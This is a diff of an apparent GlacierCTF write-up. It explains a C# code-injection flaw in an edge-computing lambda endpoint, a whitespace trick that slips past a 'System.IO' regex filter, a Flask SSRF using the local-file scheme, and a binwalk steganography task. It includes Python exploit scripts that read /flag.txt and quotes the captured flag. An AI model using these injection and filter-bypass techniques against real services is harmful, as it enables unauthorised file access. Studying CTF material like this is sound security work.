 > Cloud computing is trending? Says your grandpa!
 >
 > Edge Computing is the future! And the future is now. Today!
-> 
+>
 > Give us a lambda and an array to operate on and our modern .NET6-powered backend will compute the results on an edge near your user in no time.
-> 
+>
 > But please don't try to run custom code, because this incident will be reported.
-> 
+>
 > (Goal: Read flag.txt at the filesystem's root.)
 
-##### Attachments
+###### Attachments
 
 > Program.cs
 
 > api_usage.md
 
-#### Analysis
+##### Analysis
 
 By reading the code (and the examples given) we can clearly see how the endpoint `/rce` works: it expects a JSON with two parameters, `data` and `query`, and injects the `query` parameter, as it is, in the following code:
 
@@ -309,7 +330,7 @@ namespace RCE
 {{
     public static class Factory
     {{
-        public static Func<IEnumerable<string>, IEnumerable<object>> 
+        public static Func<IEnumerable<string>, IEnumerable<object>>
             CreateQuery = {query};
     }}
 }}
@@ -318,6 +339,7 @@ namespace RCE
 The code is then parsed, compiled and executed passing the provided data, and the output is returned.
 
 The following example is given in the markdown file:
+
 ```shell
 curl --request POST \
   --url http://localhost:8001/rce \
@@ -328,12 +350,14 @@ curl --request POST \
         \"Charmander\" : d)"
 }'
 ```
+
 which returns `["Charmander","Charmander","Charmander"]`.
 
-#### Exploiting
+##### Exploiting
 
 The exploit is pretty easy. We need to read a file, but since we cannot inject a [`using` directive](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/using-directive) we have to specify the fully qualified name of the class we want to use.
 Based on the example previously given, we set in `Data` the file we want to read and we inject the code to read it in `Query`:
+
 ```Python
 #!/usr/bin/env python3
 import requests
@@ -346,42 +370,44 @@ def send_rce(data, code):
     res = requests.post(endpoint, json=payload)
     return res.text
 
-print(send_rce(['/flag.txt'], 
+print(send_rce(['/flag.txt'],
     '(data) => data.Select((d) => System.IO.File.ReadLines(d))'))
 ```
 
-### Stage 2
+#### Stage 2
 
-#### Challenge description
+##### Challenge description
 
 > It came to our attention that a highly advanced APT targeted our edge computing system. In order to stop the attacks, we implemented even more advanced mitigations.
-> 
+>
 > Think seccomp, but for the web!
-> 
+>
 > Now there's no way an attacker could run malicious code, right?
-> 
+>
 > (Goal: Read flag.txt at the filesystem's root.)
 
-##### Attachments
+###### Attachments
 
 > Program.cs
 
 > api_usage.md
 
-#### Analysis
+##### Analysis
 
 The code is the same, except for the fact that this time a regex blocks our previous payload:
+
 ```C#
 // Here we can adjust the difficulty of the challenge by banning certain functions.
 var fileSystemUsage = Regex.IsMatch(query, "System.IO");
 
 if (fileSystemUsage) {
-    throw new Exception("'System.IO is not in the edge-computing file. 
+    throw new Exception("'System.IO is not in the edge-computing file.
         This incident will be reported.'");
 }
 ```
 
 The regex looks for the exact match of `"System.IO"`. Since we know that the grammars on which common programming languages are built typically allow us to insert any mount of whitespaces between keywords, we can bypass this regex just by inserting a whitespace between a keyword (`System` or `IO`) and the dot which separates them.
+
 ```py
 #!/usr/bin/env python3
 import requests
@@ -394,14 +420,16 @@ def send_rce(data, code):
     res = requests.post(endpoint, json=payload)
     return res.text
 
-print(send_rce(["/flag.txt"], 
+print(send_rce(["/flag.txt"],
     '(data) => data.Select((d) => System. IO.File.ReadLines(d))'))
 ```
 
-## Glacier Top News
+### Glacier Top News
+
 A Flask API with a Vue front-end is given us. The code is available [here](/downloadables/glacier_glacier_top_news.zip). Note that this challenge is running on Python 2. There are a few routes that are weirdly written, but that is probably due to Vue being used for the front-end.
 
 Then, there is an endpoint that smells of SSRF really badly:
+
 ```py
 @app.route('/api/get_resource', methods=['POST'])
 def get_resource():
@@ -449,18 +477,22 @@ Therefore, we don't need a scheme! As the flag is not in a file, the intended so
 
 Moreover, the authors also pointed out that this was the same exact problem reported in [CVE-2019-9948](https://bugs.python.org/issue35907), therefore also using `local-file` was a viable solution.
 
-# Misc
+## Misc
 
-## The Climber
+### The Climber
 
-### Description
+#### Description
+
 Last year i finally got to climb my first glacier. Look at how pretty my picture is.
 
-### Solution
+#### Solution
+
 Using binwalk on the first image to extract the other images.
+
 ```sh
 binwalk --dd='.*' glacier.jpg
 ```
+
 The 2nd image has the flag written on it(bottom right).Adjust contrast and brightness to see flag
 
 Flag: glacierctf{It'5_fUck1ng_C0ld_uP_h3r3}
